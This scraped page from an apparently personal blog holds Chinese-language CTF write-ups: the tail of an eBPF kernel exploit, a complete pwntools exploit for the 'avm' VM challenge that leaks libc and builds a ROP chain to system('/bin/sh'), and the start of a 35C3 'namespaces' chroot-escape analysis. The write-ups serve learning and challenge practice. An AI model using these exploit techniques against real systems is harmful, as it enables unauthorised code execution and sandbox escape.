class="type">uint64_t</span>)data_buf,</span><br><span class="line">        .test.ctx_size_in = <span class="keyword">sizeof</span>(md),</span><br><span class="line">        .test.ctx_in = (<span class="type">uint64_t</span>)&amp;md</span><br><span class="line">    &#125;;</span><br><span class="line">    SYSCHK(syscall(SYS_bpf, BPF_PROG_TEST_RUN, &amp;test_run_attr, <span class="keyword">sizeof</span>(test_run_attr)));</span><br><span class="line">    close(prog_fd);</span><br></pre></td></tr></table></figure>

<h2 id="三-总结"><a href="#三-总结" class="headerlink" title="三. 总结"></a>三. 总结</h2><p>​	本题题目主要是利用了eBPF人造出来的漏洞进行的攻击，通过这个攻击进行学习，可以更加清楚的了解eBPF的原理以及如何利用eBPF的漏洞实现内核态的攻击，希望通过这个漏洞的学习，可以方便我们之后对于内核攻击的深入理解。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/28/%E9%95%BF%E5%9F%8E%E6%9D%AFavm%20wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="a2ure">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="a2ure's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/12/28/%E9%95%BF%E5%9F%8E%E6%9D%AFavm%20wp/" class="post-title-link" itemprop="url">长城杯avm wp</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-12-28 20:33:08" itemprop="dateCreated datePublished" datetime="2024-12-28T20:33:08+08:00">2024-12-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-12-29 13:42:42" itemprop="dateModified" datetime="2024-12-29T13:42:42+08:00">2024-12-29</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/recurrence/" itemprop="url" rel="index"><span itemprop="name">recurrence</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>1.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h2><p>​	本题主要是一个虚拟机的题，由于比赛时间并不是很长，因此这个题在逆向方面确实没有给大家过多的难度，利用原理也十分简单，由于虚拟机中load和store指令会读取或者存入栈中的一个数组，并且这个数组的长度不够长，导致攻击者可以任意地址写栈中0xfff大小的区域，因此可以泄露Libc并且通过rop实现攻击</p>
<h2 id="二-逆向一下结构体"><a href="#二-逆向一下结构体" class="headerlink" title="二.逆向一下结构体"></a>二.逆向一下结构体</h2><p>​	首先就是程序的入口main函数，他首先初始化，之后读取0x300长度的opcode。之后进入到sub_1230函数。</p>
<p><img src="/images/avm/image-20241216092601552.png" alt="image-20241216092601552"></p>
<p>​	这里面就是对于虚拟机中的寄存器进行初始化操作，首先a1是传入的一个bss的一个地址，然后这个题其实虚拟机的逆向难度也不复杂，直接看初始化和后面的run函数就可以分析出来，初始化的时候首先初始化了rip，然后以及opcode的指针和最后结束的指针，之后就是循环的初始化寄存器的值</p>
<p><img src="/images/avm/image-20241216092741025.png" alt="image-20241216092741025"></p>
<p>​	之后通过View -&gt; open subviews -&gt; local types里面加入对应结构体信息，然后把所有的指针都转换成结构体信息。</p>
<p><img src="/images/avm/image-20241216094335171.png" alt="image-20241216094335171">	</p>
<p>​	初始化结束之后就进入到了run的函数里面，首先就是开辟了s一个栈空间，用来作为后面load和store存取数据的位置，并且对其初始化，然后循环遍历解析opcode，和0xFFFFFFFFFFFFFFFCLL取&amp;主要是为了后面的值是4的倍数，说明这个虚拟机时一个32位的虚拟机，之后进入到对应的注册函数中取根据opcode的28位的值。</p>
<p><img src="/images/avm/image-20241216092949466.png" alt="image-20241216092949466"></p>
<p>​	这里可以看到逆向之后的结果如下，就是简单的几个寄存器的功能。进入到具体的函数中，因为之前已经恢复了结构体的信息，所以进入函数之后很清楚的可以看到具体的内容。</p>
<p><img src="/images/avm/image-20241216093936842.png" alt="image-20241216093936842"></p>
<p>​	简单以store指令作为例子来解释，首先读取v3，也就是当前执行的opcode的值，之后取出右边移位5之后取出来的值对应的寄存器的值，加上右移十六位之后的opcdoe值相加，len是个固定的也就是0xff，所以这里面我的做法就是控制前面寄存器为1也就是v3 &gt;&gt; 5为1，这样由于之前清理过寄存器的值，所以我们只需要控制v3的十六位的值就可以控制整个值的内容，之后进入到If语句里面就简单的时读取传入a2也就是栈里面的值，然后把opcode最低位的对应的寄存器里面值赋值给栈中。</p>
<p><img src="/images/avm/image-20241216094621553.png" alt="image-20241216094621553"></p>
<p>​	其他所有的函数都大差不差，按照上面的思路都可以进行逆向。后面Load函数ida逆向的有点奇怪，但是实际上看一下汇编就可以看明白了，通过移位其实也就是一个字节一个字节的取赋值，因此ida逆向出来对于寄存器赋值的操作这么奇怪，在做题的时候完全可以把store反过来看就可以了。</p>
<p><img src="/images/avm/image-20241216095633714.png" alt="image-20241216095633714"></p>
<h2 id="三-漏洞利用"><a href="#三-漏洞利用" class="headerlink" title="三.漏洞利用"></a>三.漏洞利用</h2><p>​	经过上面的阐述其实也都直到漏洞的问题所在了，具体的利用思路就是通过load指令读取栈中的一些地址，比如libc中函数的地址，通过sub, add指令的功能减去偏移（这部分最开始思路想歪了，一直想着输出出来，但是其实把基地址算出来存在寄存器里面也一样）,获得到偏移之后就是利用system(“&#x2F;bin&#x2F;sh”)来执行命令，需要注意的是，这里面栈布局很神奇，在做题的时候发现很多Libc的地址根据s也就是栈中变量的偏移不固定，可以往远处找一找，比如后面的libc_start_main函数就可以了。</p>
<p>​	因此就是按照上述的思路来撰写代码，首先把需要用的几个指令封装一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">operation</span>(<span class="params">opcode, i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> p32((opcode &lt;&lt; <span class="number">28</span>) + (i &lt;&lt; <span class="number">5</span>) + (j &lt;&lt; <span class="number">16</span>) + k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">1</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">2</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">9</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">10</span>, i, j, k)</span><br></pre></td></tr></table></figure>

<p>​	之后就是选择读取栈中的值，我们可以定位在b *$rebase(0x19ea)这里，根据rsi指向的地址来往后面查，这里需要注意我之前说的内容，在0x500左右的地址会出现libc的函数地址，但是会发现这个偏移不固定，还要爆破，因此我们可以继续往下面找，直到找到libc_start_main函数这里</p>
<p><img src="/images/avm/image-20241216101845864.png" alt="image-20241216101845864"></p>
<p>​	这里的位置是0xd68，然后减去rsi和对应的偏移0x30就是我们后面写的位置0xd38了，这样我们就存了libc_start_main函数的地址了，后面就是利用寄存器sub掉和libc基地址的偏移，之后加上pop_rdi binash ret system等地址就可以了</p>
<p>​	这里再利用的时候需要注意，和常见的64位程序一样需要加一个ret，要么地址不是被0x10整除的会报错最终的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;123562999&quot;, 32801)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/libcso6&quot;</span>)</span><br><span class="line">libc_start_main = <span class="number">0x29d90</span></span><br><span class="line">pop_rdi = <span class="number">0x2a3e5</span></span><br><span class="line">ret = <span class="number">0x29139</span></span><br><span class="line">system = <span class="number">0x50d70</span></span><br><span class="line">binsh = <span class="built_in">next</span>(libcsearch(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operation</span>(<span class="params">opcode, i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> p32((opcode &lt;&lt; <span class="number">28</span>) + (i &lt;&lt; <span class="number">5</span>) + (j &lt;&lt; <span class="number">16</span>) + k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">1</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">2</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">9</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">10</span>, i, j, k)</span><br><span class="line"></span><br><span class="line">opcode = load(<span class="number">1</span>, <span class="number">0xd38</span>, <span class="number">4</span>) + load(<span class="number">1</span>, <span class="number">0x160</span>, <span class="number">5</span>) + /</span><br><span class="line">         sub(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>) + load(<span class="number">1</span>, <span class="number">0x168</span>, <span class="number">7</span>) + /</span><br><span class="line">         add(<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>) + load(<span class="number">1</span>, <span class="number">0x170</span>, <span class="number">9</span>) + /</span><br><span class="line">         add(<span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>) + load(<span class="number">1</span>, <span class="number">0x178</span>, <span class="number">11</span>) + /</span><br><span class="line">         add(<span class="number">6</span>, <span class="number">11</span>, <span class="number">12</span>) + load(<span class="number">1</span>, <span class="number">0x180</span>, <span class="number">13</span>) + /</span><br><span class="line">         add(<span class="number">6</span>, <span class="number">13</span>, <span class="number">14</span>) + store(<span class="number">1</span>, <span class="number">0x118</span>, <span class="number">8</span>) + /</span><br><span class="line">         store(<span class="number">1</span>, <span class="number">0x120</span>, <span class="number">10</span>) + store(<span class="number">1</span>, <span class="number">0x128</span>, <span class="number">12</span>) + /</span><br><span class="line">         store(<span class="number">1</span>, <span class="number">0x130</span>, <span class="number">14</span>) + p32(<span class="number">0</span>) + /</span><br><span class="line">         p64(libc_start_main) + p64(pop_rdi) + /</span><br><span class="line">         p64(binsh) + p64(ret) + p64(system)</span><br><span class="line"></span><br><span class="line">iosend(opcode)</span><br><span class="line">iorecvuntil(<span class="string">b&#x27;opcode: Unsupported instruction/n&#x27;</span>)</span><br><span class="line">iointeractive()</span><br></pre></td></tr></table></figure>

<p>​	这里可以观察到我再store之后存入了一个p32(0)这个其实是为了让地址更完整，要么读取数据的时候会发现有其他数据干扰，之后对于load和store第一个参数都是1也是就是我们之前说的，需要找一个固定寄存器内容位0的寄存器，这样我们只需要控制第二个的内容就可以控制寄存器的值了。</p>
<h2 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h2><p>​	自此基本完成了所有对于avm原理的阐述，这个题目其实逆向难度不大，当时比赛过程中主要就是一直最开始想着输出基地址一度卡住了，之后也是被随便找到libc函数地址和栈地址偏移随机这个问题给困扰很久，但是通过这个题目也是学到了很多的东西，对于vm这种虚拟机的题目也有了更进一步的了解，希望后面可以争取加快逆向时的速度以及减少掉入一些缺乏经验的错误。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/28/35C3CTF-namespace/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="a2ure">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="a2ure's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/12/28/35C3CTF-namespace/" class="post-title-link" itemprop="url">35C3CTF-namespace</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-12-28 20:25:39" itemprop="dateCreated datePublished" datetime="2024-12-28T20:25:39+08:00">2024-12-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-12-29 13:46:41" itemprop="dateModified" datetime="2024-12-29T13:46:41+08:00">2024-12-29</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Container-security/" itemprop="url" rel="index"><span itemprop="name">Container security</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>5.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>19 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="namespace的flag解释"><a href="#namespace的flag解释" class="headerlink" title="namespace的flag解释"></a>namespace的flag解释</h3><ul>
<li><strong>mnt namespaces</strong>，mount的结果不会影响其他mnt namespaces中的进程</li>
<li><strong>cgroup namespaces</strong>，cgroup用于限制进程对cpu等系统资源的使用</li>
<li><strong>uts namespaces</strong>，隔离hostname和NIS域名</li>
<li><strong>ipc namespaces</strong>，隔离消息队列、信号量和共享内存3钟进程间通信的方式，并不会限制其他的ipc通信</li>
<li><strong>user namespaces</strong>，同一个用户在不同的user namespaces中可以对应不同的uid，一个user namespaces中的普通用户甚至可以是另一个user namespaces中的root用户。此外，新建或加入一个user namespaces时，无论新的uid是多少，能够在这个user namespaces中获取到全部的capabilities，不过需要注意如果uid不为0的话执行execve等函数后capabilities会全部丢失掉</li>
<li><strong>pid namespaces</strong>，隔离进程的pid，创建新的pid namespaces后，外层的pid namespaces可以看到里面的进程，而里面的进程无法看到外面的进程</li>
<li><strong>net namespaces</strong>，隔离网络相关的资源，比如ip协议栈、路由表等等，此外它还会隔离unix域的abstract socket，这点在后面也会用到</li>
<li><strong>time namespaces</strong>, 隔离系统时间，进程在不同命名空间中可以看到不同的系统时间。</li>
</ul>
<h3 id="socket-AF-UNIX通信"><a href="#socket-AF-UNIX通信" class="headerlink" title="socket AF_UNIX通信"></a>socket AF_UNIX通信</h3><ul>
<li><strong>pathname</strong>，指的是用bind将socket绑定到一个具体的文件名上去，这里因为chroot的限制无法使用</li>
<li><strong>unnamed</strong>，没有用bind绑定的stream socket都是unnamed的，上面socketpair创建的也是。在这种两个进程分别创建socket的情况下是当作客户端去使用</li>
<li><strong>abstract</strong>，用bind将socket绑定到一个与文件系统无关的名字上去，由net namespaces进行隔离</li>
</ul>
<h2 id="题目部署"><a href="#题目部署" class="headerlink" title="题目部署"></a>题目部署</h2><p>​	本题比较经典，网上描述漏洞成因的时候有几个文章，但是在自己复现的时候发现存在一些问题。首先对于题目环境来说可以通过<a target="_blank" rel="noopener" href="https://github.com/LevitatingLion/ctf-writeups/tree/master/35c3ctf/pwn_namespaces">链接</a>进行访问。之后利用下面这个命令来启用镜像</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --privileged -v /sys/fs/cgroup:/sys/fs/cgroup:rw -v /flag:/flag -p 1337:1337 namespace</span><br></pre></td></tr></table></figure>

<p>​	需要注意我是用ubuntu 22.04的机器去复现的，但是在复现过程中发现，ubuntu使用的时cgroupv2，而这个环境复现的需要时发现如果使用v2版本会找不到cpu memery pids等文件夹，因此需要切换回v1版本，因此需要执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/default/grub</span><br><span class="line">GRUB_CMDLINE_LINUX=<span class="string">&quot;cgroup_enable=memory swapaccount=0 systemd.unified_cgroup_hierarchy=0&quot;</span> </span><br></pre></td></tr></table></figure>

<p>​	之后使用下面命令就可以重新启动机器并且切换回v1版本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-grub</span><br><span class="line"><span class="built_in">sudo</span> reboot</span><br></pre></td></tr></table></figure>

<p>​	执行成功后会显示如下信息</p>
<p><img src="/images/namespace/1735395811009.jpg" alt="1735395811009"></p>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>​	首先就是对于题目中的Dockerfile进行分析，内容如下：</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> tsuro/nsjail</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> challenge/namespaces /home/user/chal</span></span><br><span class="line"><span class="comment">#COPY tmpflag /flag</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> /bin/sh -c <span class="string">&quot;/usr/bin/setup_cgroups.sh &amp;&amp; cp /flag /tmp/flag &amp;&amp; chmod 400 /tmp/flag &amp;&amp; chown user /tmp/flag &amp;&amp; su user -c &#x27;/usr/bin/nsjail -Ml --port 1337 --chroot / -R /tmp/flag:/flag -T /tmp --proc_rw -U 0:1000:1 -U 1:100000:1 -G 0:1000:1 -G 1:100000:1 --keep_caps --cgroup_mem_max 209715200 --cgroup_pids_max 100 --cgroup_cpu_ms_per_sec 100 --rlimit_as max --rlimit_cpu max --rlimit_nofile max --rlimit_nproc max -- /usr/bin/stdbuf -i0 -o0 -e0 /usr/bin/maybe_pow.sh /home/user/chal&#x27;&quot;</span></span></span><br></pre></td></tr></table></figure>

<p>​	实际上可以看出就是利用了nsjail进行创建了一个虚拟环境来执行我们的namespaces文件，并且将docker的1000号用户(user)映射为了nsjail中的0号用户(root)，将docker中的10000号用户(nobody)映射为了nsjail中的1号用户(nobody)。并且把flag文件放到了tmp目录下，用docker中的user用户权限，也就是nsjail的root用户权限来进行执行。</p>
<p><img src="/images/namespace/1735436713608.jpg" alt="1735436713608"></p>
<p>​	接下来就是分析main函数，进入到main函数中发现本体并没有去掉符号表因此还是比较人性的，可以看到主要就是两个函数，start_sandbox和run_elf两个函数，通过用户输入选项来进行选择，之后便是先进入到start_sandbox函数里面</p>
<p><img src="/images/namespace/1735436872947.jpg" alt="1735436872947"></p>
<p>​	在函数内部，通过 socketpair 创建了一个双向管道，方便父进程与子进程之间进行通信。接着，利用 new_proc 创建子进程，并关闭不必要的文件描述符。首先，获取 ELF 文件，并通过 setgroups 等操作修改进程的特权和用户&#x2F;组映射，以调整进程的权限和身份。随后，使用 chroot 命令将进程的根目录设置为 &#x2F;tmp&#x2F;chroot&#x2F;*，从而隔离进程，避免访问其他文件系统中的数据。最后，子进程等待父进程关闭 setgroups 等权限，确保在执行 ELF 文件时无法修改或干扰其操作。</p>
<p><img src="/images/namespace/1735437325702.jpg" alt="1735437325702"></p>
<p>​	这里说明一下new_proc函数，他其实是调用了clone函数，其中的0x7E020000LLflag其实是下面的拆解</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clone syscall,<span class="number">0x7E020000</span>=CLONE_NEWNS|CLONE_NEWCGROUP|CLONE_NEWUTS|CLONE_NEWIPC|CLONE_NEWUSER|CLONE_NEWPID|CLONE_NEWNET</span><br></pre></td></tr></table></figure>

<p>​	之后便是run_elf这个函数，这里面功能比较简单，首先就是获取之前start_sandbox里面的沙盒，之后fork一个子进程，利用change_ns把子进程的namespace切换成和沙盒里面的环境一样的namespace中，之后执行。</p>
<p><img src="/images/namespace/1735437995398.jpg" alt="1735437995398"></p>
<p>​	进入到change_ns里面可以看到，首先就是一个循环，打开父进程的&#x2F;proc&#x2F;self&#x2F;ns目录下的namespace，利用setns函数切换过去，并且对于pid namespace进行了特殊处理，原因就是pid命名空间比较特殊，当前进程的pid命名空间并不会改变，只有子进程的才会进入到pid namespace中</p>
<p><img src="/images/namespace/1735438143643.jpg" alt="1735438143643"></p>
<p>​	最后就是看一下NSS变量，其实就是一个数组，通过循环回按照顺序一次执行user, mnt, pid, uts, ipc, cgroup的namespace设置，通过这里就可以发现，少了net的namespcae设置，因此在namespace下的elf中程序可以和其他的namespace下的程序进行通信，也就是本题逃逸chroot的漏洞方法</p>
<p><img src="/images/namespace/1735438406556.jpg" alt="1735438406556"></p>
<p>​	自此本题的逻辑也就分析完了，其实由于符号表都在，所以其实可以很清楚的看出对应函数执行的逻辑，我们通过对应他net namespace的缺少限制，可以对其进一步的利用</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="chroot逃逸"><a href="#chroot逃逸" class="headerlink" title="chroot逃逸"></a>chroot逃逸</h3><p>​	漏洞利用的方法就是和我们之前所说的socket通信有关，首先需要了解到的是，在linux中有一些函数是带有at的api，他们可以通过一个文件描述符加基于该文件描述符对应文件的相对路径来获得最终的文件路径，而非传统上直接由调用者给出字符串参数指定，比如下面这几个</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">openat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">unlinkat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">symlinkat</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *target, <span class="type">int</span> newdirfd, <span class="type">const</span> <span class="type">char</span> *linkpath)</span>;</span><br></pre></td></tr></table></figure>

<p>​	因此，如果我们在一个沙盒中的程序（比如root目录在&#x2F;tmp&#x2F;chroot&#x2F;1）的程序，发送一个fd给另一个沙盒中的程序（root目录在&#x2F;tmp&#x2F;chroot&#x2F;2）,那么我们就可以通过相对路径逃逸出chroot的限制，但是需要考虑的是如何发送一个fd给在不同namespace下的程序呢。这里需要注意的是，对于clone来说，会把fd一同复制给子进程，并且经过实验，如下代码可以看到，经过各种flag标志的namespace都不会影响fd的传递。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACK_SIZE (1024 * 1024)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> global_fd = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">child_func</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">128</span>];</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    fd = global_fd;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (chroot(<span class="string">&quot;namespace1&quot;</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span 